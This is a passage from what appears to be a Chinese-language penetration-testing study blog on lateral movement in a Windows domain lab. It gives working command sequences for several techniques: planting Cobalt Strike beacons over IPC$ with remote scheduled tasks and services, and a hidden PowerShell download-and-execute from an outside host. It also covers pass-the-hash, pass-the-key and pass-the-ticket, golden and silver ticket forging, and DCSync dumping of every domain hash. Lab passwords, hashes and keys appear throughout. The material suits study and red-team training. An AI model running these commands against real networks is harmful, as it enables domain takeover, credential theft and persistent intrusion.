<li>首先创建 ipc 连接，复制木马至目标主机（注意，最好不要用 system 用户，可能会出错）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.255.10\ipc$ &quot;Win.2024&quot; /user:KEA\Administrator</span><br><span class="line"></span><br><span class="line">copy artifact2.exe \\192.168.255.10\c$\ls.exe</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>开启ipc服务</li>
<li>上传cs的木马exe程序到目标主机<br><img src="https://i.imgur.com/G8MAg7N.png"></li>
</ul>
<ol start="2">
<li>创建计划任务。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 192.168.255.10 /u administrator /p Win.2024 /tn updateWindows /tr c:\ls.exe /sc onstart /ru system /F</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>不过并不建议使用system的shell，最好使用 administrator 权限，不然不好继续使用 ipc 横向。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 192.168.255.10 /u administrator /p Win.2024 /tn updateWindows /tr c:\ls.exe /sc onstart /ru administrator /F</span><br></pre></td></tr></table></figure></li>
<li>使用administrator权限创建计划任务</li>
<li>计划任务名为updateWindows</li>
<li>启动频率设置为onstart，即开机自启动<br><img src="https://i.imgur.com/jSsAnzD.png"></li>
</ul>
<ol start="3">
<li><p>运行计划任务上线。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /run /s 192.168.255.10 /u administrator /p Win.2024 /i /tn updateWindows</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/ii27JG8.png"><br>很快cs就回显上线了<br><img src="https://i.imgur.com/zh6Qw9P.png"></p>
</li>
<li><p>删除计划任务：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell schtasks /delete /s 192.168.255.10 /u administrator /p Win.2024 /tn updateWindows /f</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/ProY53j.png"></p>
</li>
</ol>
<h3 id="ipc-配合服务"><a href="#ipc-配合服务" class="headerlink" title="ipc$配合服务"></a>ipc$配合服务</h3><p>建立 ipc 连接之后，还可以直接远程创建服务上线木马。创建服务 test 并且指定执行路径 注意<code>=</code>右边需要有一个空格</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.255.10 create test binpath= &quot;cmd.exe /c c:C:\Users\Administrator\Desktop\artifact2.exe&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/wYhe535.png"></p>
<ul>
<li>使用sc远程创建名为test的服务</li>
<li>启动时将调用 <code>cmd.exe /c C:\Users\Administrator\Desktop\artifact2.exe</code> 来执行桌面上的文件</li>
</ul>
<p>powershell 上线</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\dc.kea.com create test1 binpath= &quot;cmd.exe /c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadsrting(&#x27;http://192.168.31.212/1.ps1&#x27;))&quot;</span><br></pre></td></tr></table></figure>

<p>开启服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.255.10 start test</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/cVffkuw.png" alt="x|950x150"></p>
<ul>
<li>似乎报错？但服务成功上线了<br><img src="https://i.imgur.com/aOjJgmH.png" alt="x|950x400"></li>
</ul>
<p>删除服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.197.30 delete test</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/YlQjErK.png"></p>
<h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><p>PTH 攻击，也就是哈希传递攻击，是一种在内网渗透中常见的攻击手段。</p>
<p>想象一下，你有一个带锁的箱子，这个箱子用一把钥匙来打开。但是，你并没有这把钥匙，而是拿到了一个这把钥匙的“指纹”（也就是这个钥匙的某种独特特征的数字化表示，但不是钥匙本身）。虽然你没有钥匙，但只要你找到了一个能识别这个“指纹”的锁（或者是一个能被这个“指纹”欺骗的系统），你就能打开这个箱子。</p>
<p>在 PTH 攻击中，这个“箱子”就是受保护的计算机系统或资源，“钥匙”就是用户的明文密码，而“指纹”就是密码的哈希值。</p>
<p>具体来说，在域环境中（比如公司或组织内部的网络环境），&#x3D;&#x3D;用户登录计算机时通常使用域账号，而且很多计算机在安装时会使用相同的本地管理员账号和密码&#x3D;&#x3D;。如果攻击者获取到了这个本地管理员账号的哈希值，他就可以使用这个哈希值来登录内网中的其他计算机，就像他自己是那个管理员一样。</p>
<p>PTH 攻击前提：<br>• 目标机器开放 445 端口。<br>• 具备管理员的 NTLM 哈希值，并且目标使用了同样的账号密码。</p>
<h3 id="不同用户权限区别"><a href="#不同用户权限区别" class="headerlink" title="不同用户权限区别"></a>不同用户权限区别</h3><p>以下均讨论默认情况。</p>
<ul>
<li>本地用户:而 Windows2003、Windows XP、Windows visaa 可以使用普通管理员用户进行PTH 攻击。Windows2003 之后的机器，只能使用 administrator 用户进行 PTH 攻击。</li>
<li>域用户:对于域最高管理员 administrator、Domain Admins 组中的域管理员用户，都可以进行 PTH 攻击。但是域内普通用户不可以。</li>
</ul>
<h3 id="Hash-碰撞查询可用-PTH"><a href="#Hash-碰撞查询可用-PTH" class="headerlink" title="Hash 碰撞查询可用 PTH"></a>Hash 碰撞查询可用 PTH</h3><p>PTH 传递除了权限要求之外，还有一个重要前提就是双方的用户名密码一致，那</p>
<p>如何得知拥有相同账号密码的机器，其实不用知道，全部跑一遍就行了。</p>
<h4 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><p>命令如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user administrator /domain:192.168.255.10 /ntlm:8f43b30edfe321e2fb2d2c227ef35993&quot;</span><br></pre></td></tr></table></figure>

<p>这里使用域成员机192.168.255.10连接到域控192.168.255.4</p>
<p>获取到目标机器的hash<br><img src="https://i.imgur.com/rDJoOt6.png" alt="700"></p>
<ul>
<li>hash:8f43b30edfe321e2fb2d2c227ef35993</li>
</ul>
<p>到域控机执行mimikatz命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user Administrator /domain:192.168.255.10 /ntlm:8f43b30edfe321e2fb2d2c227ef35993&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/peoiNeH.png"></p>
<p>之后会弹出一个 shell，该 shell 已经和目标主机已经建立了认证，&#x3D;&#x3D;该认证通过之后可以远程创建、执行计划任务和服务&#x3D;&#x3D;，从而我们可以直接上线。image-20241108145245337<br><img src="https://i.imgur.com/BJS0Huk.png"></p>
<p>如下所示（远程创建服务也可以）:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">copy beacon_x64.exe \\192.168.197.40\c$\b.exe</span><br><span class="line"></span><br><span class="line">schtasks /create /s 192.168.197.40 /tn test /tr c:\b.exe /Ru administrator /sc onstart /F</span><br><span class="line"></span><br><span class="line">schtasks /run /s 192.168.197.40 /tn test /i</span><br></pre></td></tr></table></figure>

<h4 id="CS-PTH-上线"><a href="#CS-PTH-上线" class="headerlink" title="CS PTH 上线"></a>CS PTH 上线</h4><p>通过学习我们知道了 PTH,本质是上认证，之前学习过的 IPC$连接是通过账号密码进行认证的。</p>
<p>PTH 是通过账号和 hash 值进行认证的，但是光认证还是不够的，认证通过之后还需要配合上传，计划任务，服务等其他的操作进行上线，CS 支持 jump 命令，配合 psexec 一键上线。</p>
<p><img src="https://i.imgur.com/hynbYKc.png"></p>
<p><img src="https://i.imgur.com/KDXQ6IY.png" alt="600"></p>
<ul>
<li>前三项是选定本地抓取到的凭证，选择要上线的目标用户凭证,domian项这里注意还是填写目标ip地址好些</li>
<li>第四项选择使用的监听器</li>
<li>第五项选择通过哪个机器&#x2F;用户进行传递</li>
<li>这里是使用192.168.255.4横向移动到192.168.255.10上线</li>
</ul>
<p>所执行的操作<br><img src="https://i.imgur.com/GSsXqbW.png" alt="800"><br><img src="https://i.imgur.com/x3wNcTf.png" alt="800"></p>
<p>成功上线<br><img src="https://i.imgur.com/kRxn3tc.png"></p>
<h4 id="CractMapExec批量-pth"><a href="#CractMapExec批量-pth" class="headerlink" title="CractMapExec批量 pth"></a>CractMapExec批量 pth</h4><p>这里需要使用 LM:NTLM</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackMapexec.exe 192.168.197.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:35a2fedaa43b5f18e4ed98f3cf70c092</span><br></pre></td></tr></table></figure>

<p>这里选用192.168.255.10的LM:NTLM<br><img src="https://i.imgur.com/DF1HGcu.png"></p>
<ul>
<li>获得hash：aad3b435b51404eeaad3b435b51404ee:8f43b30edfe321e2fb2d2c227ef35993</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell crackMapexec.exe 192.168.255.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8f43b30edfe321e2fb2d2c227ef35993</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/7IHwreX.png" alt="1200"><br>这工具自己的环境只测试 普通用户，不去测本地的 administrator，故而全部失败。</p>
<p>解决方式。</p>
<ul>
<li>指定-d 参数时，如果域名不存在那么就会测试本地用户。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell crackMapexec.exe 192.168.255.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8f43b30edfe321e2fb2d2c227ef35993 -d local</span><br></pre></td></tr></table></figure>
<img src="https://i.imgur.com/AsePSeD.png" alt="1200"></li>
</ul>
<p>后续使用192.168.255.4中用户的hash<br><img src="https://i.imgur.com/5ZFg60n.png" alt="1200"></p>
<ul>
<li>获得hash：aad3b435b51404eeaad3b435b51404ee:987e86984253d2517b0bc8f1306d9e16</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell crackMapexec.exe 192.168.255.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:987e86984253d2517b0bc8f1306d9e16</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/pqFpKy4.png" alt="1200"></p>
<h3 id="PTK"><a href="#PTK" class="headerlink" title="PTK"></a>PTK</h3><p>PTK(Pass The key)),中文叫秘钥传递攻击，PTH 传递中，使用的是 NTLM-HASH 值进行认证，PTK 使用 AES256 或者 AES128 的方式进行传递，PTK 攻击只能用于kerberos 认证中，NTLM 认证中不存在这一攻击手法。</p>
<p>在 kerberos 认证中，其中 AS-REQ 数据包中的 PA-DATA- pc-ENC-TIMESTAMP 中的数据是进行加密的，加密的方式由 etype 决定，可以选择使用用户 HASH 加密或者 AES key 加密，所以会产生 PTH 和 PTK 攻击。</p>
<p>AES KEY 又分为 256 位和 128 位。AES-KEY 只在 kerberos 认证中使用，所以一般域用户才会有该值。</p>
<p>可以使用 <code>mimikatz “privilege::debug” “sekurlsa::ekeys”</code> 读取 AES key。</p>
<p>如果在域内机器中使用该命令，可能会抓到机器用户的 AES Key。</p>
<p>利用条件<br>1、必须是域环境，使用域账号才能进行 PTK 攻击。<br>2、kerberos 支持 AES 认证。</p>
<p>使用 impacket-psexec 完成 PTK 攻击:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">全域名/用户名@域名地址 -aeskey xxx</span><br><span class="line"></span><br><span class="line">gouzi.com/dadmin@dc.gouzi.com -aesKey 8cac5b0cf475d11099d7d9f787f02fac304227bc3b0ae6dab20a318317bfc065</span><br></pre></td></tr></table></figure>
<p>246951e5d9a1233b12117c071830d76d2ae8b6e5b509a3b848e21838cc85100c</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getTGT.exe kea.com/Adminitrator.kea.com -aesKey 3f7d53bb696c889aabf38ead93a4c002efc3e088bbb94e6b9207f0c0cc800519</span><br></pre></td></tr></table></figure>

<p>dadmin 是一个域管账号,这里使用普通域用户可能会失败。</p>
<h4 id="PTK-上线-CS"><a href="#PTK-上线-CS" class="headerlink" title="PTK 上线 CS"></a>PTK 上线 CS</h4><p>PTK 本质上也是一种认证，本身不具有攻击性，如果知道一些特殊账号的 KEY 就可以利用 PTK 传递攻击，我们可以 getTGT 工具生成对应账号的 TGT 票据(后缀是ccache)，然后将票据导入到内存中，取得对目标机器的访问权。后续可以使用计划任务、服务等上线 CS。</p>
<p>这之前的环境准备，由于未知原因mimikatz的命令无法读取到Adminitrator的AESKEY，所有这里选择在域控新建了一个testuser1用户作为管理员权限用户</p>
<ol>
<li><p>最开始的时候确认票据<br><img src="https://i.imgur.com/cGHlcGa.png"></p>
</li>
<li><p>使用 <code>mimikatz “privilege::debug” “sekurlsa::ekeys”</code> 读取 AES key。<br><img src="https://i.imgur.com/qPbxbvK.png" alt="1000"><br><img src="https://i.imgur.com/jq4MfPd.png" alt="1000"></p>
</li>
<li><p>生成 TGT 票据:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getTGT.exe kea.com/testuser1 -aesKey 3f7d53bb696c889aabf38ead93a4c002efc3e088bbb94e6b9207f0c0cc800519</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/0qwDQVc.png" alt="800"></p>
</li>
<li><p>导入内存:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptc testuser1.ccache&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/cMPZJKm.png" alt="800"></p>
</li>
<li><p>查看是否导入成功</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe kerberos::list</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/XsAxPu2.png" alt="800"></p>
</li>
</ol>
<p>查看票据列表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell klist</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/z0MrGwR.png" alt="800"></p>
<p>而且可以正常访问其他用户<br><img src="https://i.imgur.com/qleMPyM.png" alt="800"></p>
<ol start="6">
<li>传递木马,创建并执行计划任务<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">copy artifact2.exe \\192.168.255.10\c$\ptk.exe</span><br><span class="line"></span><br><span class="line">schtasks /create /s 192.168.255.10 /tr c:\ptk.exe /tn ptktest /sc onstart /ru system /f</span><br><span class="line"></span><br><span class="line">schtasks /run /s 192.168.255.10 /tn ptktest /i</span><br></pre></td></tr></table></figure>
<img src="https://i.imgur.com/uWBi7n3.png"><br>成功上线<br><img src="https://i.imgur.com/yDXynMu.png"></li>
</ol>
<blockquote>
<p>[!NOTE] 删除计划任务<br><code>shell schtasks /delete /s 192.168.255.10 /u administrator /p Win.2024 /tn ptktest /f</code></p>
</blockquote>
<ol start="7">
<li>清除票据:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::purge</span><br></pre></td></tr></table></figure>
<img src="https://i.imgur.com/yIFnec2.png"></li>
</ol>
<h3 id="PTT-PTC"><a href="#PTT-PTC" class="headerlink" title="PTT&amp;PTC"></a>PTT&amp;PTC</h3><p>PTK(Pass The Ticket)中文叫票据传递攻击，PTT 攻击只能用于 kerberos 认证中，NTLM 认证中没有。PTT 是通过票据进行认证的，回顾 kerberos 认证的流程便可理解，不再赘述。进行票据传递，不需要提权。</p>
<p>获取 TGT 和 ST 的方式:<br>• 域账号明文密码<br>• 域账号的 NTLM-HASH<br>• 域账号的 Aes key<br>• 直接伪造<br>• 系统漏洞<br>• 系统遗留票据</p>
<p>使用明文生成票据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getTGT.exe gouzi.com/dadmin:123456</span><br><span class="line"></span><br><span class="line">getTGT.exe gouzi.com/dadmin -hashes LM-HASH:NTLM-HASH</span><br></pre></td></tr></table></figure>

<p>利用条件<br>1、域内环境<br>2、能够获取相应的票据(主要针对域管理员)</p>
<p>Ccahe 和 Kirbi 票据：不同的工具获取的票据后缀不一样，常见的有 Ccache 和 Kirbi。</p>
<ul>
<li>getTGT 工具生成的是 Ccache 票据</li>
<li>kekeo 工具生成的是 Kirbi 票据。<br>但是本质上都可以作为 TGT 票据，且可以互相转换</li>
</ul>
<h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>原理忘了就回顾一下 kerberos，我们之前学的 PTK、PTT 攻击都是通过正常的认证流程使得 KDC 返回一张合法票据，但是前提就是必须要拥有高权限用户的 hash值或者 aes key。</p>
<p>假设我们已经控制了 DC，能够通过各种手段获取 krbtgt 用户的 hash 值，就能不依靠 KDC 凭空生成一张黄金票据，这种做法比较隐蔽且不好溯源。所以一般用来作为内网权限维持（黄金票据可以在工作组环境下使用）的一种常用手段。</p>
<p>利用条件<br>• krbtgt 用户的 hash 值<br>• 域名<br>• 域的 SID 值<br>• 伪造用户</p>
<p>域的 sid 值使用任意域用户执行 whoami &#x2F;all 即可得出:<br><img src="https://i.imgur.com/mzvyOwG.png"></p>
<ul>
<li>去此处得SID用于后续实验：S-1-5-21-880678290-82948828-1398698765-500</li>
</ul>
<p>1、使用 mimikatz制作黄金票据并且注入内存</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::golden /user:administrartor /domain:kea.com /sid:S-1-5-21-880678290-82948828-1398698765-500 /krbtgt:a2b1adb8df28b28ea2472b73b960c967 /ptt</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/wGOZOli.png"></p>
<ul>
<li>此处的sid取的域用户机Win-1</li>
<li>次数krbtgt请在域控机器上运行hashdump自行获取<br>jump上线<br><img src="https://i.imgur.com/OwgaSmk.png"><br><img src="https://i.imgur.com/SjVV8TI.png"></li>
</ul>
<p>2、使用 impacket-ticketer:生成.ccache 票据。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ticketer.exe -domain-sid &quot;sid&quot; -nthash &quot;NTLMHASH&quot; -domain &quot;domain&quot; &quot;username&quot;</span><br><span class="line"></span><br><span class="line">ticketer.exe -domain-sid S-1-5-21-880678290-82948828-1398698765-500 -nthash a2b1adb8df28b28ea2472b73b960c967 -domain kea.com administrator</span><br><span class="line"></span><br><span class="line">mimikatz.exe kerberos::ptc administrator.ccache</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/M3M1B57.png"></p>
<p>3、MSF kiwi</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">golden_ticket_create -d gouzi.com -k 0e5c40110da014eaf2fe8d862194af7f -s S-1-5-21-4192929989-692860420-895873630 -u administrator -t /tmp/administrator.ticket</span><br></pre></td></tr></table></figure>

<blockquote>
<p>[!NOTE]<br>上线过程不再演示，唯一要注意的是如果需要利用工作组机器使用黄金票据访问 dc,如果当前机器不能通过域名直接访问机器，就需要修改 host文件或者 dns 配置。比如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo 192.168.197.10 dc.gouzi.com &gt;&gt; C:</span><br><span class="line"></span><br><span class="line">netsh interface ipv4 add dns 本地连接 192.168.197.10</span><br></pre></td></tr></table></figure>
<p>这里的本地连接是网卡名字，可以使用 systeminfo 看见，中文机器常使用”本地连接”</p>
</blockquote>
<p>域外机器尝试上线: </p>
<ol>
<li>使用ticketer.exe离线生成.ccache票据<br><img src="https://i.imgur.com/zAyljql.png"></li>
</ol>
<ul>
<li>sid取先前域用户的</li>
<li>hash先前krbtgt</li>
</ul>
<ol start="2">
<li><p>将生成的票据塞进域外的机器,使用mimikatz.exe的命令来将票价凭证注入内存<br><img src="https://i.imgur.com/IVOUGmC.png"><br>验证是否成功导入票据<br><img src="https://i.imgur.com/4F98t7g.png"></p>
</li>
<li><p>将该机器的dns改为目标机器的域名192.168.255.10<br><img src="https://i.imgur.com/hucCXGT.png"></p>
</li>
<li><p>使用jump命令上线<br><img src="https://i.imgur.com/nb8mHnk.png"><br><img src="https://i.imgur.com/stu6e54.png"></p>
</li>
</ol>
<h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>白银票据就是伪造 ST 票据，在整个 kerberos 协议认证过程中，跳过了 TGS 的认证。</p>
<p>一般伪造 ST 票据中的服务都是系统自带的服务，比如 CIFS、HOST 服务，方便后续横向移动。</p>
<p>前提条件</p>
<ul>
<li>域名&amp;域 SID</li>
<li>服务端全域名</li>
<li>服务端可利用的 SPN</li>
<li>服务端 SPN 注册用户的 hash 值(一般选择机器用户 hash)</li>
<li>需要伪造的用户名</li>
</ul>
<p>机器用户 hash 值的获取方式：</p>
<ul>
<li>mimikatz-域管理员 dcsync</li>
<li>secretsdump-域管理员读取密码</li>
</ul>
<p>票据制作</p>
<p>白银票据也是一种权限维持的方式，所以我们伪造的服务目的一般是为了方便横向移动。需要根据不同的控制手段来选择不同的服务。</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>需要的服务</th>
</tr>
</thead>
<tbody><tr>
<td>copy|dir|psexec cifs</td>
<td>cifs</td>
</tr>
<tr>
<td>计划任务&#x2F;服务</td>
<td>host</td>
</tr>
<tr>
<td>dcsync</td>
<td>cifs、ldap</td>
</tr>
<tr>
<td>winrs</td>
<td>http</td>
</tr>
<tr>
<td>wmi</td>
<td>RestrictedKrbHost、host、RPCSS</td>
</tr>
</tbody></table>
<h4 id="实验-使用-mimikatz-制作白银票据："><a href="#实验-使用-mimikatz-制作白银票据：" class="headerlink" title="实验-使用 mimikatz 制作白银票据："></a>实验-使用 mimikatz 制作白银票据：</h4><p>为了避免特权用户的影响，所以这里选用一个域成员机器来实验:<br><img src="https://i.imgur.com/mww7HKX.png"></p>
<ol>
<li>生成cifs服务白银票据<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::golden /domain:kea.com /sid:S-1-5-21-697776903-4083723091-3295495450 /target:WIN-DBNULB576SJ.kea.com /service:cifs /rc4:79b2d38d45d8909a4a27108d9f71935b /user:dadmin /ptt</span><br></pre></td></tr></table></figure>
<img src="https://i.imgur.com/1Q7k4Ob.png"></li>
</ol>
<ul>
<li>sid采用机器用户域控管理员用户的sid</li>
<li>hash采用域控用户中机器用户WIN-DBNULB576SJ的hash</li>
<li>服务选定为cifs文件服务<br>确认票据成功生成<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell klist</span><br></pre></td></tr></table></figure>
<img src="https://i.imgur.com/S5vE3dr.png"></li>
</ul>
<ol start="2">
<li>确认服务成功生效<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\WIN-DBNULB576SJ.kea.com\c$</span><br></pre></td></tr></table></figure>
<img src="https://i.imgur.com/xbHE2An.png"></li>
</ol>
<h4 id="实验-伪造-ldap-服务上线-dc："><a href="#实验-伪造-ldap-服务上线-dc：" class="headerlink" title="实验-伪造 ldap 服务上线 dc："></a>实验-伪造 ldap 服务上线 dc：</h4><blockquote>
<p>对当前 shell 环境没有要求<br>如果当前机器不在域，需要修改 DNS</p>
</blockquote>
<p>先确认环境能否正常使用dcsync服务<br><img src="https://i.imgur.com/r64yjaJ.png"></p>
<p>制作 ldap 票据和 cifs 票据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::golden /domain:gouzi.com /sidS-1-5-21-697776903-4083723091-3295495450 /target:dc.gouzi.com /service:ldap /rc4:da1ac177f6e26a201455def0ae82fc2b /user:dadmin /ptt</span><br><span class="line"></span><br><span class="line">mimikatz kerberos::golden /domain:gouzi.com /sid:S-1-5-21-697776903-4083723091-3295495450 /target:dc.gouzi.com /service:cifs /rc4:da1ac177f6e26a201455def0ae82fc2b /user:dadmin /ptt</span><br></pre></td></tr></table></figure>
<p>这里添加ldap票据<br><img src="https://i.imgur.com/1RexTCM.png"></p>
<p>dcsync 查询 hash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz lsadump::dcsync /all /csv</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/I5n52So.png"></p>
<p>利用 krbtgt 用户制作金票<br>CS 自带黄金票据制作功能，填入域的 sid 和 krbtgt 用户的 hash 值，选择一个用户制作即可（一般是域管或者 administrator）</p>
<p>psexec 横向移动:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jump psexec dc.gouzi.com</span><br></pre></td></tr></table></figure>



<p>WMI（Windows Management Instrumentation，Windows 管理规范）是 Windows操作系统中内置的系统工具框架，它是 Windows 2000&#x2F;XP 及更高版本管理系统的核心组件，属于管理数据和操作的基础模块。</p>
<p>WMI 旨在实现本地或远程的系统、应用程序等资源的管理、配置、监视。它使用WQL 查询语言进行数据查询，并可通过 PowerShell、WMIC 和 WBEMTEST 等工具进行交互。WMI 支持 DCOM 和 WinRM 协议，允许网络管理员监视设备、访问重要信息，并在故障排查、安全审计等方面发挥重要作用。在使用 wmiexec 进行横向移动时，不会在系统中留下操作日志，可以在一定程度上规避安全设备(wmic 走的是 rpc 协议)。</p>
<blockquote>
<p>WMIC（Windows Management Instrumentation Command-line）是 WMI的一个命令行工具，用于与 WMI 进行交互。是一个比 Windows CMD 更加强大的命令集。</p>
</blockquote>
<p><strong>wmic 常用命令如下:</strong></p>
<p>当前登录用户:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic logon list brief</span><br></pre></td></tr></table></figure>

<p>用户列表:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic list brief</span><br><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure>

<p>启动项:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup list brief</span><br></pre></td></tr></table></figure>

<p>安装软件:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure>

<p>补丁情况:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe list brief</span><br></pre></td></tr></table></figure>

<p>是否虚拟机:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic bios list full |findstr /i &quot;vmware&quot;</span><br></pre></td></tr></table></figure>

<p>获取指定程序的路径和启动命令行:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process where name=&quot;cmd.exe&quot; get ExecutablePath,CommandLine</span><br></pre></td></tr></table></figure>

<p>连接远程电脑(高权限用户):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:&quot;ip&quot; /user:user /password:pass</span><br></pre></td></tr></table></figure>

<p>创建进程:</p>
